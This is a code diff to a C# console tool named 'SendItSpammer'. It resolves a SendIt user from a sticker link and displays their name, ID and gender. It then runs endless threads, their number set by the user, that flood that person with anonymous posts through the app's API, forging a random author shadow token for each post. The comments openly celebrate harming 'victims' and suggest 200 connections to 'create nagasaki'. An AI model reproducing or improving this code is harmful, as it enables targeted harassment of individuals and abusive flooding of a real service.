@@ -20,113 +20,188 @@ namespace SendItSpammer
 {
     internal class Program
     {
+        // Class instantiation
         static Core core = Core.GetInstance();
         static Random rand = new Random();
 
+        // Total sent requests
         static int sentReqs = 0;
 
+        /// <summary>
+        /// Generate a string
+        /// </summary>
+        /// <param name="len">Length of string</param>
+        /// <param name="charset">Charset to use, default is shadow token characters</param>
+        /// <returns>Random string</returns>
         static string gen(int len, string charset = "abcdef123456789012345678901234567890")
         {
+            // Turn charset into char[]
             char[] allchars = charset.ToCharArray();
+
+            // Instantiate the string builder
             var sb = new StringBuilder();
 
+            // While less than length, add more
             for (var x =0;x < len;x++)
-                sb.Append(allchars[rand.Next(0, allchars.Length - 1)]);
+                sb.Append(allchars[rand.Next(0, allchars.Length - 1)]); // Random.
 
+            // Join all chars and return.
             return sb.ToString();
         }
 
+        /// <summary>
+        /// Send the request to the API
+        /// </summary>
+        /// <param name="recId">Recipient ID</param>
+        /// <param name="content">Content</param>
+        /// <param name="info">Sticker</param>
         static void sendReq(string recId, string content, dynamic info)
         {
+            // Create the body object
             dynamic reqJson = new ExpandoObject();
 
+            // Set type and timer
             reqJson.type = "sendit.post-type:question-and-answer-v1";
             reqJson.timer = 0;
 
+            // Set recipient ID
             reqJson.recipient_identity = new ExpandoObject();
             reqJson.recipient_identity.type = "id";
             reqJson.recipient_identity.value = recId;
 
+            // Set the content
             reqJson.data = new ExpandoObject();
             reqJson.data.question = content;
 
+            // Extra data with the shadow token
+            // Whats the point of calling it an anonymous response app, if you can pay to see who sent it
+            // Dumbass shit ong.
             reqJson.ext_data = new ExpandoObject();
             reqJson.ext_data.sticker_id = (string)info.payload.sticker.id;
             reqJson.ext_data.author_shadow_token = $"{gen(8)}-{gen(4)}-{gen(4)}-{gen(4)}-{gen(12)}";
             reqJson.ext_data.snap_reference_id = null;
 
+            // Setup web request
             var req = WebRequest.Create("https://api.getsendit.com/v1/posts");
+            
+            // All request data
             req.Method = "POST";
             req.ContentType = "application/json";
             req.Headers.Add("App-Id", "c2ad997f-1bf2-4f2c-b5fd-83926e8f3c65");
             req.Headers.Add("App-Version", "1.0");
 
-            // Write request
+            // 5 seconds until it times out, so we dont sit and waste resources
+            req.Timeout = 5000;
+
+            // Write the request data
             var str = req.GetRequestStream();
             byte[] serialized = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(reqJson));
             str.Write(serialized, 0, serialized.Length);
             str.Close();
 
+            // This is going to be deserialized later, so lets just put a default
             string rawRes = "{}";
+
+            // No crash pls
             try
             {
+                // Read the response from the request
                 rawRes = new StreamReader(req.GetResponse().GetResponseStream()).ReadToEnd();
             } catch (WebException ex)
             {
+                // Make sure there was actually data, sometimes there isn't for some reason?
                 if (ex.Response == null)
                     return;
 
+                // Write back the response
                 rawRes = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
+
+                // Also debug logging :troll:
                 Debug.WriteLine(rawRes);
             }
 
+            // No crashhh
             try
             {
+                // Deserialize using newtonsoft (goated)
                 dynamic json = JsonConvert.DeserializeObject(rawRes);
+                
+                // Output for debug purposes
                 Debug.WriteLine(rawRes);
+
+                // Make sure it actually "sent"
                 if ((string)json.status != "success")
                     core.WriteLine(Color.Red, $"Failed to send: {json.error.code}");
-                else
+                else // W
                 {
+                    // Request was (probably) sucessfully sent
                     core.WriteLine(Color.Lime, $"Sent request with data {content}");
+
+                    // Increment counter for the titlebar
                     sentReqs++;
+
+                    // Finally update the titlebar with the *very cool* success
                     core.UpdateTitleStatus($"Sent {sentReqs} requests");
                 }
             } catch (Exception ex)
             {
+                // Damn :mfwsad:
                 core.WriteLine(Color.Red, "We do a little trolling?");
                 Debug.WriteLine(ex);
             }
         }
 
+        /// <summary>
+        /// Get information on a SendIt sticker
+        /// </summary>
+        /// <param name="id">Sticker ID</param>
+        /// <returns>Sticker information from API</returns>
         static dynamic getInfo(string id)
         {
+            // Create the request and assign the basic data
             var req = WebRequest.Create($"https://api.getsendit.com/v1/stickers/{id}");
             req.Headers.Add("App-Id", "c2ad997f-1bf2-4f2c-b5fd-83926e8f3c65");
             req.Headers.Add("App-Version", "1.0");
 
+            // Default fallback for JSON deserialization later
             string rawRes = "{}";
+
+            // NO CRASH
             try
             {
+                // Read response
                 rawRes = new StreamReader(req.GetResponse().GetResponseStream()).ReadToEnd();
             }
             catch (WebException ex)
             {
+                // Read error *sigh*
                 rawRes = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
             }
 
+            // Deserialize data
             dynamic json = JsonConvert.DeserializeObject(rawRes);
 
+            // Output for debug
             Debug.WriteLine(rawRes);
-            if ((string)json.status != "success")
+
+            // Hopefully it worked?
+            if ((string)json.status != "success") // Nah.
                 core.WriteLine(Color.Red, $"Failed to get information for ID: {json.error.code}");
 
+            // Return the JSON the API returned (on success ofc)
             return json;
         }
 
+        /// <summary>
+        /// Entry point
+        /// </summary>
+        /// <param name="args">trolled</param>
         static void Main(string[] args)
         {
+            // Set the window height to make it look cool.
             Console.WindowHeight = Console.LargestWindowHeight < 50 ? Console.LargestWindowHeight : 50;
+
+            // Setup the UI
             var props = new Core.StartupProperties {
                 LogoString = @"                    _ _ _                                                   
  ___  ___ _ __   __| (_) |_   ___ _ __   __ _ _ __ ___  _ __ ___   ___ _ __ 
@@ -155,34 +230,59 @@ namespace SendItSpammer
                 },
             };
 
+            // Disable splash screen on debug run
 #if DEBUG
             props.SplashScreen = null;
 #endif
 
+            // Start UI
             core.Start(props);
 
+            // Get basic information
             string link = core.ReadLine("Link : ");
             string content = core.ReadLine("Content : ");
 
-            ServicePointManager.DefaultConnectionLimit = 25;
+            // Get how many concurrent connections they want
+            int connections;
+            ConnectionLimit:
 
+            // No crash!
+            try
+            {
+                // I recommend 20 - 30
+                // If you want to create nagasaki, try 200 like {SK}
+                ServicePointManager.DefaultConnectionLimit = int.Parse(core.ReadLine("Connection limit : "));
+                connections = ServicePointManager.DefaultConnectionLimit;
+            }
+            catch // Damn. You don't know what a number is yet huh?
+            {
+                core.WriteLine("Invalid input");
+                goto ConnectionLimit;
+            }
+
+            // Get sticker information
             var info = getInfo(link.Split('/')[4].Split('?')[0]);
             var author = info.payload.sticker.author;
 
+            // Create the ASCII table to display all the information in a *sexy* format
             var table = new AsciiTable(new AsciiTable.Properties { Colors = new AsciiTable.ColorProperties { RainbowDividers = true } });
             table.AddColumn("Name");
             table.AddColumn((string)author.display_name);
             table.AddRow("ID", (string)author.id);
             table.AddRow("Gender", (string)author.gender ?? "Unknown");
 
+            // Output
             table.WriteTable();
 
+            // Confirmation
             core.WriteLine("Is this correct?");
             var resp = new SelectionMenu("Yes", "No").Activate();
 
+            // Incorrect. Exit.
             if (resp != "Yes")
                 Environment.Exit(0);
 
+            // You just got trolled.
             string trolling = @"[0;34;40m                                                                                                    [0m
 [0;34;40m                           .[0;32;40m.[0;31;40m:[0;34;40m:[0;32;40m:[0;31;40m:[0;34;40m;[0;32;40m;[0;31;40m;[0;34;40m;[0;32;40m;[0;31;40m;[0;34;40m;[0;32;40m;[0;31;40m;[0;34;40m;[0;32;40m;[0;31;40m;[0;34;40m;[0;32;40m;[0;31;40m;[0;34;40m:[0;32;40m:[0;31;40m:[0;34;40m.[0;32;40m.[0;31;40m.[0;34;40m.[0;32;40m.[0;31;40m    [0;34;40m                                        [0m
 [0;34;40m                     :[0;33;5;40;100m%[0;37;5;40;100mX[0;1;37;97;47m.S88[0;37;5;47;107m88@XXXXSS8[0;1;37;97;47m@t[0;1;30;90;47m.;%t%%SSX@88@@XS%t%%%SX8[0;37;5;40;100m88[0;36;5;40;100m   [0;30;5;40;100mS[0;1;30;90;40m8[0;34;40m.[0;32;40m.[0;31;40m    [0;34;40m                       [0m
@@ -233,22 +333,28 @@ namespace SendItSpammer
 [0;34;40m                                      [0;32;40m           [0;34;40m    [0;31;40m [0;32;40m .[0;31;40m:[0;32;40m.[0;31;40m     .[0;32;40m;[0;1;30;90;40m8[0;30;5;40;100m@[0;35;5;40;100m.[0;33;5;40;100m [0;37;5;40;100m8[0;1;30;90;47mXt:[0;1;37;97;47m.:;;;ttt; [0;1;30;90;47mt[0;37;5;40;100m8[0;36;5;40;100m [0;1;30;90;40m8[0;34;40m:[0;31;40m.[0;32;40m.[0;34;40m [0;31;40m  [0;34;40m       [0m
 [0;34;40m                                       [0;32;40m          [0;34;40m    [0;31;40m  [0;32;40m .[0;31;40m     [0;32;40m [0;34;40m.[0;31;40m.[0;34;40m  [0;32;40m .[0;31;40m   [0;32;40m [0;31;40m    [0;34;40m         [0;32;40m .[0;31;40m     [0;34;40m       [0m";
 
+            // Trolled.
             core.WriteLine(new Core.MessageProperties { Time = null, Label = null }, trolling);
             core.Delay(1000);
 
-            for (var x = 0; x < 40; x++)
+            // Spawn threads
+            for (var x = 0; x < connections; x++)
             {
+                // Creation
                 new Thread(() =>
                 {
+                    // Never stop :smiling_imp:
                     while (true)
                     {
+                        // No crashes to save your sorry victims either
                         try
                         {
+                            // They a goner.
                             sendReq((string)author.id, $"[{gen(5, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")}] {content}", info);
                         }
                         catch { }
                     }
-                }).Start();
+                }).Start(); // Oh yeah, start.
             }
         }
     }
